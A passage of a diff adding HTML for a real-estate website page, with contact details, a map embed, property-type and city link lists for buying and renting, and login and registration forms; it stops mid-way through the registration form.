+                                            </defs>
+                                        </svg>
+                                    </div>
+									                                    <div class="">
+                                        <h5 class="text-color-4">Email us</h5>
+                                        <a href="mailto:info@luxurypropertybuilders.com"><h4 class="fw-4 text-color-3"><span class="__cf_email__" >info@luxurypropertybuilders.com</span></h4></a>
+                                    </div>
+									                                </div>
+                            </div>
+                        </div>
+                        <div class="col-lg-6 col-md-5">
+                            <div class="images z-2 relative">
+                                <img src="https://luxurypropertybuilders.com/frontend/assets/images/mark/mark-contact3.png" alt="images">
+                            </div>
+                        </div> 
+                    </div>
+                </div>
+                <!-- <div class="mark-img">
+                    <img src="https://luxurypropertybuilders.com/frontend/assets/images/mark/mark-vector.png" alt="images">
+                </div> -->
+            </section>
+
+            <section class="flat-map">
+                <div class="container-fuild">
+                        <iframe class="map-content"
+                        src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d224356.85923040553!2d77.23700973928675!3d28.522404037240705!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x390ce5a43173357b%3A0x37ffce30c87cc03f!2sNoida%2C%20Uttar%20Pradesh!5e0!3m2!1sen!2sin!4v1745235971891!5m2!1sen!2sin" allowfullscreen="" loading="lazy"></iframe>
+                    
+                </div>
+            </section>
+           
+
+            <!--<section class="flat-contact-page page" hidden>
+                <div class="container">
+                    <div class="row">                      
+                        <div class="col-lg-12">
+                            <div id="comments" class="comments bg-white">
+                                <div class="heading-box center">
+                                    <div class="heading-title fs-30 fw-7 lh-45">Contact Us</div>
+                                    <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Fusce sed tristique metus proin id lorem odio</p>
+                                </div>
+                                <div class="respond-comment">                                  
+                                    <form method="post" id="contactform" class="comment-form form-submit" action="https://luxurypropertybuilders.com/submit-query" accept-charset="utf-8" novalidate="novalidate">
+									<input type="hidden" name="_token" value="DmlZmLCObtTIgcMxPS3RK4UIEmR7iraBcaoGRVPH">                                        <div class="text-wrap flex form-wg">
+                                            <fieldset class="info-box">
+                                                <label class="fw-6">Your name</label>
+                                                <input type="text" class="tb-my-input" name="name" placeholder="Your name" required="">
+                                            </fieldset>
+                                            <fieldset class="info-box">
+                                                <label class="fw-6">Email or phone</label>
+                                                <input type="email" class="tb-my-input" name="email" placeholder="Email or phone number" required="">
+                                            </fieldset>
+                                            <div class="info-box">
+                                                <label class="fw-6">Property type</label>
+                                                <div class="" tabindex="0">
+												<select class="nice-select" name="type_id" required="">
+													<option value="">Choose</option>
+																										<option value="15">Office</option>
+																										<option value="17">Residential Plot</option>
+																										<option value="18">Residential Builder Floor</option>
+																										<option value="19">Duplex</option>
+																										<option value="20">Building/Kothi/Villa/House</option>
+																										<option value="21">DDA Flat</option>
+																										<option value="22">Society Flat</option>
+																										<option value="23">Industrial zones</option>
+																										<option value="25">Residential zones</option>
+																										<option value="26">Shop/Showroom/Retail</option>
+																										<option value="27">Commercial Complex/mall</option>
+																										<option value="28">Industrial Plot</option>
+																										<option value="29">HSIIDC INDUSTRIAL PLOT</option>
+																										<option value="30">DDA INDUSTRL PLOT</option>
+																										<option value="31">Industrial Floor</option>
+																										<option value="33">Pre-Leased/Rented</option>
+																										<option value="34">Pre-Leased/Rented</option>
+																										<option value="35">Pre-Leased/Rented</option>
+																										<option value="36">Builder Project</option>
+																										<option value="37">Builder Project</option>
+																										<option value="40">Warehouses</option>
+																										<option value="41">Free Zone</option>
+																										<option value="42">Industrial Building</option>
+																										<option value="43">Residential</option>
+																										<option value="44">Agriculture Land</option>
+																									</select>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        
+                                        <fieldset class="message-wrap">
+                                            <label class="fw-6">Message</label>
+                                            <textarea id="comment-message" name="message" rows="4" tabindex="4"
+                                                placeholder="Your message" required=""
+                                                aria-required="true"></textarea>
+                                        </fieldset>                                           
+                                        <div class="button-boxs">
+                                            <button class="sc-button btn-icon"  name="submit" type="submit">
+                                                <svg width="19" height="18" viewBox="0 0 19 18" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                                    <g clip-path="url(#clip0_1505_28737)">
+                                                    <path d="M17.7381 0.0295345L0.899726 5.53166C0.424186 5.68706 0.355417 6.33388 0.788208 6.58552L7.1516 10.2857C7.24979 10.3428 7.36258 10.3699 7.47599 10.3635C7.5894 10.3572 7.69846 10.3177 7.78965 10.2499L9.57844 8.92152L8.25002 10.7103C8.1823 10.8015 8.14281 10.9106 8.13645 11.024C8.13009 11.1374 8.15714 11.2502 8.21424 11.3484L11.9144 17.7118C12.1664 18.1449 12.813 18.0754 12.9683 17.6003L18.4705 0.76186C18.618 0.309727 18.1881 -0.117584 17.7381 0.0295345ZM12.2669 16.0078L9.41045 11.0954L12.8548 6.45741C12.9378 6.34558 12.9779 6.20763 12.9676 6.06873C12.9574 5.92984 12.8976 5.79924 12.7991 5.70076C12.7006 5.60228 12.57 5.54247 12.4311 5.53225C12.2923 5.52203 12.1543 5.56207 12.0425 5.64507L7.40447 9.08947L2.49215 6.233L17.0112 1.48874L12.2669 16.0078ZM6.59633 12.7247L2.74099 16.58C2.51425 16.8067 2.1466 16.8068 1.91987 16.58C1.69309 16.3533 1.69309 15.9856 1.91987 15.7589L5.77521 11.9036C6.00202 11.6769 6.36967 11.6768 6.59633 11.9036C6.82311 12.1303 6.82311 12.498 6.59633 12.7247ZM1.50311 12.8706C1.27634 12.6438 1.27634 12.2762 1.50311 12.0495L3.02438 10.5282C3.25112 10.3014 3.61877 10.3014 3.8455 10.5282C4.07228 10.7549 4.07228 11.1226 3.8455 11.3493L2.32424 12.8706C2.09754 13.0973 1.72985 13.0973 1.50311 12.8706ZM7.97175 14.6544C8.19852 14.8811 8.19852 15.2488 7.97175 15.4755L6.45045 16.9968C6.3966 17.0508 6.33261 17.0936 6.26215 17.1228C6.1917 17.152 6.11617 17.167 6.0399 17.1669C5.52724 17.1669 5.26254 16.5424 5.62936 16.1756L7.15066 14.6544C7.37736 14.4276 7.74501 14.4276 7.97175 14.6544Z" fill="white"/>
+                                                    </g>
+                                                    <defs>
+                                                    <clipPath id="clip0_1505_28737">
+                                                    <rect width="18" height="18" fill="white" transform="translate(0.5)"/>
+                                                    </clipPath>
+                                                    </defs>
+                                                </svg>
+                                                <span>Send request</span>
+                                            </button>
+                                        </div>
+                                    </form>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>-->
+
+            <section hidden class="flat-brand tf-section center page-contact relative" ><div class="overlay"></div>
+                <div class="container">
+                    <div class="row">                      
+                        <div class="col-lg-12">
+                            <div class="title-section">
+                                <h5>Trusted by over 150+ major companies</h5>
+                            </div>
+                            <div class="swiper-container carousel-5">                            
+                                <div class="swiper-wrapper">
+                                    <div class="swiper-slide">
+                                        <div class="slogan-logo">
+                                             <a>
+                                                <img src="https://luxurypropertybuilders.com/frontend/assets/images/img-box/brand-1.png" alt="images">
+                                            </a>
+                                        </div>                         
+                                    </div>
+                                    <div class="swiper-slide">
+                                        <div class="slogan-logo">
+                                             <a>
+                                                <img src="https://luxurypropertybuilders.com/frontend/assets/images/img-box/brand-2.png" alt="images">
+                                            </a>
+                                        </div>                         
+                                    </div>
+                                    <div class="swiper-slide">
+                                        <div class="slogan-logo">
+                                             <a>
+                                                <img src="https://luxurypropertybuilders.com/frontend/assets/images/img-box/brand-3.png" alt="images">
+                                            </a>
+                                        </div>                         
+                                    </div>
+                                    <div class="swiper-slide">
+                                        <div class="slogan-logo">
+                                             <a>
+                                                <img src="https://luxurypropertybuilders.com/frontend/assets/images/img-box/brand-4.png" alt="images">
+                                            </a>
+                                        </div>                         
+                                    </div>
+                                    <div class="swiper-slide">
+                                        <div class="slogan-logo">
+                                             <a>
+                                                <img src="https://luxurypropertybuilders.com/frontend/assets/images/img-box/brand-5.png" alt="images">
+                                            </a>
+                                        </div>                         
+                                    </div>
+                                    <div class="swiper-slide">
+                                        <div class="slogan-logo">
+                                             <a>
+                                                <img src="https://luxurypropertybuilders.com/frontend/assets/images/img-box/brand-6.png" alt="images">
+                                            </a>
+                                        </div>                         
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+      <!-- Footer -->
+      <section class="pdfl-sec" hidden>
+    <div class="container-fluid pl_pr">
+        <div class="row">
+            <div class="col-lg-3 titlefooter">
+                <div class="widget widget-menu style-3">
+                    <h3>Flats for Sale in Bangalore</h3>
+                    <ul class="box-menu">
+                    <li><a href="">Flats for Sale in Whitefield</a></li>
+                    <li><a href="">Flats for Sale in Indira Nagar</a></li>
+                    </ul>
+                </div>
+            </div>
+            <div class="col-lg-3 titlefooter">
+                 <div class="widget widget-menu style-3">
+                    <h3>Flats for Sale in Mumbai</h3>
+                    <ul class="box-menu">
+                    <li><a href="">Flats for Sale in Whitefield</a></li>
+                    <li><a href="">Flats for Sale in Indira Nagar</a></li>
+                    </ul>
+                </div>
+            </div>
+            <div class="col-lg-3 titlefooter">
+                 <div class="widget widget-menu style-3">
+                    <h3>Flats for Sale in Chennai</h3>
+                    <ul class="box-menu">
+                    <li><a href="">Flats for Sale in Whitefield</a></li>
+                    <li><a href="">Flats for Sale in Indira Nagar</a></li>
+                    </ul>
+                </div>
+            </div>
+            <div class="col-lg-3 titlefooter">
+                 <div class="widget widget-menu style-3">
+                    <h3>Flats for Sale in Pune</h3>
+                    <ul class="box-menu">
+                    <li><a href="">Flats for Sale in Whitefield</a></li>
+                    <li><a href="">Flats for Sale in Indira Nagar</a></li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+
+<section class="tabs">
+    <input type="radio" name="tabs" id="tabone1"  checked="checked" >
+    <label for="tabone1">Buy</label>
+    <div class="tab">
+        <section class="pdfl-sec">
+            <div class="container-fluid pl_pr">
+                <div class="row">
+                    <div class="col-lg-3 titlefooter">
+                        <div class="widget widget-menu style-3">
+                            <h3>Properties for Sale</h3>
+                            <ul class="box-menu">
+                                                            <li>
+                                   <a href="https://luxurypropertybuilders.com/properties-for-sale-in-kolkata">Property for Sale in Kolkata</a>
+                                </li>
+                                                            <li>
+                                   <a href="https://luxurypropertybuilders.com/properties-for-sale-in-moradabad">Property for Sale in Moradabad</a>
+                                </li>
+                                                            <li>
+                                   <a href="https://luxurypropertybuilders.com/properties-for-sale-in-lucknow">Property for Sale in Lucknow</a>
+                                </li>
+                                                            <li>
+                                   <a href="https://luxurypropertybuilders.com/properties-for-sale-in-chennai">Property for Sale in Chennai</a>
+                                </li>
+                                                            <li>
+                                   <a href="https://luxurypropertybuilders.com/properties-for-sale-in-thane">Property for Sale in Thane</a>
+                                </li>
+                                                            <li>
+                                   <a href="https://luxurypropertybuilders.com/properties-for-sale-in-pune">Property for Sale in Pune</a>
+                                </li>
+                                                            <li>
+                                   <a href="https://luxurypropertybuilders.com/properties-for-sale-in-mumbai-city">Property for Sale in Mumbai City</a>
+                                </li>
+                                                            <li>
+                                   <a href="https://luxurypropertybuilders.com/properties-for-sale-in-bangalore">Property for Sale in Bangalore</a>
+                                </li>
+                                                            <li>
+                                   <a href="https://luxurypropertybuilders.com/properties-for-sale-in-gurgaon">Property for Sale in Gurgaon</a>
+                                </li>
+                                                            <li>
+                                   <a href="https://luxurypropertybuilders.com/properties-for-sale-in-ahmedabad">Property for Sale in Ahmedabad</a>
+                                </li>
+                                                        </ul>
+                        </div>
+                    </div>
+                    <div class="col-lg-3 titlefooter">
+                        <div class="widget widget-menu style-3">
+                            <h3>Properties for Sale</h3>
+                            <ul class="box-menu">
+                                                            <li>
+                                    <a href="https://luxurypropertybuilders.com/agriculture-land-for-sale-in-new-delhi">Agriculture Land for Sale in New Delhi</a>
+                                </li>
+                                                            <li>
+                                    <a href="https://luxurypropertybuilders.com/residential-for-sale-in-new-delhi">Residential for Sale in New Delhi</a>
+                                </li>
+                                                            <li>
+                                    <a href="https://luxurypropertybuilders.com/industrial-building-for-sale-in-new-delhi">Industrial Building for Sale in New Delhi</a>
+                                </li>
+                                                            <li>
+                                    <a href="https://luxurypropertybuilders.com/free-zone-for-sale-in-new-delhi">Free Zone for Sale in New Delhi</a>
+                                </li>
+                                                            <li>
+                                    <a href="https://luxurypropertybuilders.com/warehouses-for-sale-in-new-delhi">Warehouses for Sale in New Delhi</a>
+                                </li>
+                                                            <li>
+                                    <a href="https://luxurypropertybuilders.com/builder-project-for-sale-in-new-delhi">Builder Project for Sale in New Delhi</a>
+                                </li>
+                                                            <li>
+                                    <a href="https://luxurypropertybuilders.com/builder-project-commercial-property-for-sale-in-new-delhi">Builder Project for Sale in New Delhi</a>
+                                </li>
+                                                            <li>
+                                    <a href="https://luxurypropertybuilders.com/pre-leasedrented-for-sale-in-new-delhi">Pre-Leased/Rented for Sale in New Delhi</a>
+                                </li>
+                                                            <li>
+                                    <a href="https://luxurypropertybuilders.com/pre-leasedrented-industrial-property-for-sale-in-new-delhi">Pre-Leased/Rented for Sale in New Delhi</a>
+                                </li>
+                                                            <li>
+                                    <a href="https://luxurypropertybuilders.com/pre-leasedrented-warehouse-for-sale-in-new-delhi">Pre-Leased/Rented for Sale in New Delhi</a>
+                                </li>
+                                                        </ul>
+                        </div>
+                    </div>
+                    <div class="col-lg-3 titlefooter">
+                        <div class="widget widget-menu style-3">
+                            <h3></h3>
+                            <ul class="box-menu">
+                                                            <li>
+                                    <a href="https://luxurypropertybuilders.com/industrial-floor-for-sale-in-new-delhi">Industrial Floor for Sale in New Delhi</a>
+                                </li>
+                                                            <li>
+                                    <a href="https://luxurypropertybuilders.com/dda-industrl-plot-for-sale-in-new-delhi">DDA INDUSTRL PLOT for Sale in New Delhi</a>
+                                </li>
+                                                            <li>
+                                    <a href="https://luxurypropertybuilders.com/hsiidc-industrial-plot-for-sale-in-new-delhi">HSIIDC INDUSTRIAL PLOT for Sale in New Delhi</a>
+                                </li>
+                                                            <li>
+                                    <a href="https://luxurypropertybuilders.com/industrial-plot-for-sale-in-new-delhi">Industrial Plot for Sale in New Delhi</a>
+                                </li>
+                                                            <li>
+                                    <a href="https://luxurypropertybuilders.com/commercial-complexmall-for-sale-in-new-delhi">Commercial Complex/mall for Sale in New Delhi</a>
+                                </li>
+                                                            <li>
+                                    <a href="https://luxurypropertybuilders.com/shopshowroomretail-for-sale-in-new-delhi">Shop/Showroom/Retail for Sale in New Delhi</a>
+                                </li>
+                                                            <li>
+                                    <a href="https://luxurypropertybuilders.com/residential-zones-for-sale-in-new-delhi">Residential zones for Sale in New Delhi</a>
+                                </li>
+                                                            <li>
+                                    <a href="https://luxurypropertybuilders.com/industrial-zones-for-sale-in-new-delhi">Industrial zones for Sale in New Delhi</a>
+                                </li>
+                                                            <li>
+                                    <a href="https://luxurypropertybuilders.com/society-flat-for-sale-in-new-delhi">Society Flat for Sale in New Delhi</a>
+                                </li>
+                                                            <li>
+                                    <a href="https://luxurypropertybuilders.com/dda-flat-for-sale-in-new-delhi">DDA Flat for Sale in New Delhi</a>
+                                </li>
+                                                        </ul>
+                        </div>
+                    </div>
+                    <div class="col-lg-3 titlefooter">
+                        <div class="widget widget-menu style-3">
+                            <h3></h3>
+                            <ul class="box-menu">
+                                                            <li>
+                                    <a href="https://luxurypropertybuilders.com/buildingkothivillahouse-for-sale-in-new-delhi">Building/Kothi/Villa/House for Sale in New Delhi</a>
+                                </li>
+                                                            <li>
+                                    <a href="https://luxurypropertybuilders.com/duplex-for-sale-in-new-delhi">Duplex for Sale in New Delhi</a>
+                                </li>
+                                                            <li>
+                                    <a href="https://luxurypropertybuilders.com/residential-builder-floor-for-sale-in-new-delhi">Residential Builder Floor for Sale in New Delhi</a>
+                                </li>
+                                                            <li>
+                                    <a href="https://luxurypropertybuilders.com/residential-plot-for-sale-in-new-delhi">Residential Plot for Sale in New Delhi</a>
+                                </li>
+                                                            <li>
+                                    <a href="https://luxurypropertybuilders.com/office-for-sale-in-new-delhi">Office for Sale in New Delhi</a>
+                                </li>
+                                                        </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </div>
+    <input type="radio" name="tabs" id="tabone2" >
+    <label for="tabone2">Rent</label>
+    <div class="tab">
+        <section class="pdfl-sec">
+            <div class="container-fluid pl_pr">
+                <div class="row">
+                    <div class="col-lg-3 titlefooter">
+                        <div class="widget widget-menu style-3">
+                            <h3>Properties for Rent</h3>
+                            <ul class="box-menu">
+                                                            <li>
+                                   <a href="https://luxurypropertybuilders.com/properties-for-rent-in-kolkata">Property for Rent in Kolkata</a>
+                                </li>
+                                                            <li>
+                                   <a href="https://luxurypropertybuilders.com/properties-for-rent-in-moradabad">Property for Rent in Moradabad</a>
+                                </li>
+                                                            <li>
+                                   <a href="https://luxurypropertybuilders.com/properties-for-rent-in-lucknow">Property for Rent in Lucknow</a>
+                                </li>
+                                                            <li>
+                                   <a href="https://luxurypropertybuilders.com/properties-for-rent-in-chennai">Property for Rent in Chennai</a>
+                                </li>
+                                                            <li>
+                                   <a href="https://luxurypropertybuilders.com/properties-for-rent-in-thane">Property for Rent in Thane</a>
+                                </li>
+                                                            <li>
+                                   <a href="https://luxurypropertybuilders.com/properties-for-rent-in-pune">Property for Rent in Pune</a>
+                                </li>
+                                                            <li>
+                                   <a href="https://luxurypropertybuilders.com/properties-for-rent-in-mumbai-city">Property for Rent in Mumbai City</a>
+                                </li>
+                                                            <li>
+                                   <a href="https://luxurypropertybuilders.com/properties-for-rent-in-bangalore">Property for Rent in Bangalore</a>
+                                </li>
+                                                            <li>
+                                   <a href="https://luxurypropertybuilders.com/properties-for-rent-in-gurgaon">Property for Rent in Gurgaon</a>
+                                </li>
+                                                            <li>
+                                   <a href="https://luxurypropertybuilders.com/properties-for-rent-in-ahmedabad">Property for Rent in Ahmedabad</a>
+                                </li>
+                                                        </ul>
+                        </div>
+                    </div>
+                    <div class="col-lg-3 titlefooter">
+                        <div class="widget widget-menu style-3">
+                            <h3>Properties for Rent</h3>
+                            <ul class="box-menu">
+                                                            <li>
+                                    <a href="https://luxurypropertybuilders.com/agriculture-land-for-rent-in-new-delhi">Agriculture Land for Rent in New Delhi</a>
+                                </li>
+                                                            <li>
+                                    <a href="https://luxurypropertybuilders.com/residential-for-rent-in-new-delhi">Residential for Rent in New Delhi</a>
+                                </li>
+                                                            <li>
+                                    <a href="https://luxurypropertybuilders.com/industrial-building-for-rent-in-new-delhi">Industrial Building for Rent in New Delhi</a>
+                                </li>
+                                                            <li>
+                                    <a href="https://luxurypropertybuilders.com/free-zone-for-rent-in-new-delhi">Free Zone for Rent in New Delhi</a>
+                                </li>
+                                                            <li>
+                                    <a href="https://luxurypropertybuilders.com/warehouses-for-rent-in-new-delhi">Warehouses for Rent in New Delhi</a>
+                                </li>
+                                                            <li>
+                                    <a href="https://luxurypropertybuilders.com/builder-project-for-rent-in-new-delhi">Builder Project for Rent in New Delhi</a>
+                                </li>
+                                                            <li>
+                                    <a href="https://luxurypropertybuilders.com/builder-project-commercial-property-for-rent-in-new-delhi">Builder Project for Rent in New Delhi</a>
+                                </li>
+                                                            <li>
+                                    <a href="https://luxurypropertybuilders.com/pre-leasedrented-for-rent-in-new-delhi">Pre-Leased/Rented for Rent in New Delhi</a>
+                                </li>
+                                                            <li>
+                                    <a href="https://luxurypropertybuilders.com/pre-leasedrented-industrial-property-for-rent-in-new-delhi">Pre-Leased/Rented for Rent in New Delhi</a>
+                                </li>
+                                                            <li>
+                                    <a href="https://luxurypropertybuilders.com/pre-leasedrented-warehouse-for-rent-in-new-delhi">Pre-Leased/Rented for Rent in New Delhi</a>
+                                </li>
+                                                        </ul>
+                        </div>
+                    </div>
+                    <div class="col-lg-3 titlefooter">
+                        <div class="widget widget-menu style-3">
+                            <h3></h3>
+                            <ul class="box-menu">
+                                                            <li>
+                                    <a href="https://luxurypropertybuilders.com/industrial-floor-for-rent-in-new-delhi">Industrial Floor for Rent in New Delhi</a>
+                                </li>
+                                                            <li>
+                                    <a href="https://luxurypropertybuilders.com/dda-industrl-plot-for-rent-in-new-delhi">DDA INDUSTRL PLOT for Rent in New Delhi</a>
+                                </li>
+                                                            <li>
+                                    <a href="https://luxurypropertybuilders.com/hsiidc-industrial-plot-for-rent-in-new-delhi">HSIIDC INDUSTRIAL PLOT for Rent in New Delhi</a>
+                                </li>
+                                                            <li>
+                                    <a href="https://luxurypropertybuilders.com/industrial-plot-for-rent-in-new-delhi">Industrial Plot for Rent in New Delhi</a>
+                                </li>
+                                                            <li>
+                                    <a href="https://luxurypropertybuilders.com/commercial-complexmall-for-rent-in-new-delhi">Commercial Complex/mall for Rent in New Delhi</a>
+                                </li>
+                                                            <li>
+                                    <a href="https://luxurypropertybuilders.com/shopshowroomretail-for-rent-in-new-delhi">Shop/Showroom/Retail for Rent in New Delhi</a>
+                                </li>
+                                                            <li>
+                                    <a href="https://luxurypropertybuilders.com/residential-zones-for-rent-in-new-delhi">Residential zones for Rent in New Delhi</a>
+                                </li>
+                                                            <li>
+                                    <a href="https://luxurypropertybuilders.com/industrial-zones-for-rent-in-new-delhi">Industrial zones for Rent in New Delhi</a>
+                                </li>
+                                                            <li>
+                                    <a href="https://luxurypropertybuilders.com/society-flat-for-rent-in-new-delhi">Society Flat for Rent in New Delhi</a>
+                                </li>
+                                                            <li>
+                                    <a href="https://luxurypropertybuilders.com/dda-flat-for-rent-in-new-delhi">DDA Flat for Rent in New Delhi</a>
+                                </li>
+                                                        </ul>
+                        </div>
+                    </div>
+                    <div class="col-lg-3 titlefooter">
+                        <div class="widget widget-menu style-3">
+                            <h3></h3>
+                            <ul class="box-menu">
+                                                            <li>
+                                    <a href="https://luxurypropertybuilders.com/buildingkothivillahouse-for-rent-in-new-delhi">Building/Kothi/Villa/House for Rent in New Delhi</a>
+                                </li>
+                                                            <li>
+                                    <a href="https://luxurypropertybuilders.com/duplex-for-rent-in-new-delhi">Duplex for Rent in New Delhi</a>
+                                </li>
+                                                            <li>
+                                    <a href="https://luxurypropertybuilders.com/residential-builder-floor-for-rent-in-new-delhi">Residential Builder Floor for Rent in New Delhi</a>
+                                </li>
+                                                            <li>
+                                    <a href="https://luxurypropertybuilders.com/residential-plot-for-rent-in-new-delhi">Residential Plot for Rent in New Delhi</a>
+                                </li>
+                                                            <li>
+                                    <a href="https://luxurypropertybuilders.com/office-for-rent-in-new-delhi">Office for Rent in New Delhi</a>
+                                </li>
+                                                        </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </div>
+    
+</section>
+<div class="widget-bottom-footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-12">
+                <div class="menuli_css">
+                    <ul class="dflex_css">
+                        <li><a href="https://luxurypropertybuilders.com">Home</a></li>
+                        <li><a href="https://luxurypropertybuilders.com/about-us">About Us</a></li>
+                        <li><a href="https://luxurypropertybuilders.com/properties">Properties</a></li>
+                        <li><a href="https://luxurypropertybuilders.com/cities">City</a></li>
+                        <li><a href="https://luxurypropertybuilders.com/agents-brokers-in-new-delhi.htm">Our Agents</a></li>
+                        <li><a href="javascript:;">Term & Condition</a></li>
+                        <li><a href="javascript:;">Privacy Policy</a></li>
+                        <li><a href="https://luxurypropertybuilders.com/contact-us">Contact Us</a></li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<div class="">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-12">
+                <div class="mbtm">
+                    <p class="text-1 text-center" hidden>
+                        New Delhi - 110096                         <span class="text-1 text-color-8" style="margin-left:50px;">Total Visitor - 211897</span>
+                    </p>
+                    <p class="text-1 text-center">
+                        Copyright © 2025, luxurypropertybuilders.com                         Website Designed and Developed by Digital Prisma                     </p>
+                </div>
+                <div class="icon-social box-3 text-color-1 " style="margin:20px;">
+                                        <a href="#" target="_blank"><i class="fab fa-facebook-f"></i></a>
+                                                            <a href="#" target="_blank"><i class="fab fa-twitter"></i></a>
+                                                            <a href="#" target="_blank"><i class="fab fa-linkedin-in"></i></a>
+                                                            <a href="#" target="_blank"><i class="fab fa-instagram"></i></a>
+                                    </div>
+            </div>
+        </div>
+    </div>
+</div>
+</div>
+</div>
+</div>
+<a id="scroll-top" class="button-go"></a>   
+<!-------------------Login Reg pop Up Start---------------->
+
+<div class="modal fade popup" id="popup_bid" tabindex="-1" role="dialog" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-centered" role="document">
+    <div class="modal-content">
+      <button
+        type="button"
+        class="close"
+        data-dismiss="modal"
+        aria-label="Close">
+        <span aria-hidden="true">&times;</span>
+      </button>
+      <div class="modal-body space-y-20 pd-40">
+        <div class="wrap-modal flex">
+          <div class="images flex-none">
+            <img src="https://luxurypropertybuilders.com/frontend/assets/images/section/registry.jpg" alt="images" />
+            <div class="mark-logo" hidden>
+              <img src="https://luxurypropertybuilders.com/frontend/assets/images/logo/logo2.png" alt="images" />
+            </div>
+          </div>
+          <div class="content">
+            <div class="title-login fs-30 fw-7 lh-45">Login</div>
+            <div class="comments">
+              <div class="respond-comment">
+                <form name="loginForm" id="loginForm" method="post" action="https://luxurypropertybuilders.com/user/login" class="comment-form form-submit">
+                  <input type="hidden" name="_token" value="DmlZmLCObtTIgcMxPS3RK4UIEmR7iraBcaoGRVPH">                                    
+                  <fieldset class="">
+                    <label class="fw-6">Account</label>
+                    <input
+                      type="email"
+                      id="emails"
+                      class="tb-my-input"
+                      name="email" value=""
+                      placeholder="Email or user name"/>
+                    <img
+                      class="img-icon img-email"
+                      src="https://luxurypropertybuilders.com/frontend/assets/images/icon/icon-gmail.svg"
+                      alt="images"/>
+                  </fieldset>
+                  <fieldset class="style-wrap"eyeIcon1" style="position:relative">
+                    <label class="fw-6">Password</label>
+                    <input
+                      type="password"
+                      class="input-form password-input"
+                      placeholder="Your password"  id="id_password"
+					  name="password"/>
+                    <img
+                      class="img-icon"
+                      src="https://luxurypropertybuilders.com/frontend/assets/images/icon/icon-password.svg"
+                      alt="images"/>
+                    <div class="input-group-append">
+            <div class="input-group-text">
+            <button type="button" id="btnToggle1" class="toggle-eyepass" style="
+                position: absolute;
+                right: 10px;
+                top: 46px;"><i id="eyeIcon1" class="fa fa-eye fa-eye-slash"></i></button>
+            </div>
+          </div>
+                  </fieldset>
+                  <div class="title-forgot">
+                    <a class="fs-13" href="https://luxurypropertybuilders.com/user/forgot-password">Forgot password</a>
+                  </div>
+                  <button class="sc-button" name="submit" type="submit" id="loginFormBtn" style="background: #000;">
+                    <span>Login</span>
+                  </button>
+                </form>
+              </div>
+            </div>
+            <div class="text-box text-center fs-13">
+              Don’t you have an account?
+              <a class="font-2 fw-7 fs-13 color-popup text-color-3" data-toggle="modal" data-target="#popup_bid2" data-dismiss="modal" aria-label="Close" href="javascript:;">Register</a>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="modal fade popup" id="popup_bid2" tabindex="-1" role="dialog" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-centered modal-dialog-scrollable" role="document" >
+    <div class="modal-content">
+      <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+        <span aria-hidden="true">&times;</span>
+      </button>
+      <div class="modal-body space-y-20 pd-40 style2 register_popup_model" style="height: 800px; overflow-y: scroll;">
+        <div class="wrap-modal flex">
+          <div class="images flex-none relative">
+            <img src="https://luxurypropertybuilders.com/frontend/assets/images/section/registry.jpg" alt="images" />
+            <div class="mark-logo" hidden>
+              <img src="https://luxurypropertybuilders.com/frontend/assets/images/logo/logo2.png" alt="images" />
+            </div>
+          </div>
+          <div class="content">
+            <div class="title-login fs-22 fw-7 ">Register</div>
+            <div class="comments">
+              <div class="respond-comment">
+                <div class="flat-tabs cdr_india-tabs">
+                  <div class="content-tab" >
+                    <div class="content-inner tab-content" >
+                    <form class="comment-form form-submit container-fluid popup_form" id="popRegister" method="post" action="https://luxurypropertybuilders.com/user/register">
+                        <input type="hidden" name="_token" value="DmlZmLCObtTIgcMxPS3RK4UIEmR7iraBcaoGRVPH">                        <div class="box-tab center">
+                        <ul class="menu-tab tab-title flex align-center" style="column-gap: 10px;margin-bottom: 20px;">
+                        <li class="item-title active" data-tooltip="User">
+                        <input type="radio" checked aria-selected="true" name="role" style="margin-right: 5px;"  value="1" id="me1"><label for="me1" class="fw-6">Buyer/Seller</label>
+                        </li>
+                        <li class="item-title" data-tooltip="Service Provider">
+                            <input type="radio" name="role" style="margin-right: 5px;" value="3" id="me3"><label class="fw-6" for="me3">Service Provider</label>
+                        </li>
+                        <li class="item-title" data-tooltip="Agent/Associate">
+                            <input type="radio" name="role" style="margin-right: 5px;" value="2" id="me2"><label class="fw-6" for="me2">Agent/Associate</label>
+                        </li>
+                        </ul>
+                    </div>
+                    <div class="row">
+                        <fieldset class="col-md-6 popup_form_field">
+                        <label class="fw-6">Name</label>
+                        <div class="popup_form_field_new">
+                            <img
+                            class="img-name"
+                            src="https://luxurypropertybuilders.com/frontend/assets/images/icon/login-user.svg"
+                            alt="images">
+                            <input
+                            type="text"
+                            class="tb-my-input"
+                            name="name"
+                            placeholder="Enter Name" required
+                        />
+                        </div>
+                        </fieldset>
+                        <fieldset class="col-md-6 popup_form_field">
+                        <label class="fw-6">Mobile Number</label>
+                        <div class="popup_form_field_new">
+                            <img
+                            src="https://luxurypropertybuilders.com/frontend/assets/images/icon/phone-call.png"
+                            alt="images"
+                            style="width: 18px; height: 18px;">
+                        <input
+                            type="number"
+                            class="tb-my-input"
+                            name="phone"
+                            placeholder="Mobile Number" required/>
+                        </div>
+                        </fieldset>
+                        <fieldset class="col-12  popup_form_field">
+                        <label class="fw-6">Email</label>
+                        <div class="popup_form_field_new">
+                            <img src="https://luxurypropertybuilders.com/frontend/assets/images/icon/icon-gmail.svg"
+                            alt="images">
+                        <input type="email"
+                            class="tb-my-input"
+                            name="email"
+                            placeholder="Email" required/>
+                        
+                        </div>
+                        </fieldset>
